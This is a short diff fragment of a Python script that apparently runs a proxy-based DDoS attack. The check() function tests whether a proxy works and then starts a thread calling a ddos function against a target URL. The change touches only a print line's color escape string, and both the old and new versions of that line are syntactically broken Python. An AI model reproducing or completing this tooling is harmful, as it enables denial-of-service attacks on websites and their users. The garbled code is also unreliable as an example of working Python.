@@ -50,7 +50,7 @@ def check(ip, prox, url):
 	except:
 		ipx = ip
 	if ip != ipx:
-		print(033[1;32m.133[0m"{} good! Starting...".format(prox)+Style.RESET_ALL)
+		print(\033[1;32m.133[0m"{} good! Starting...".format(prox)+Style.RESET_ALL)
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
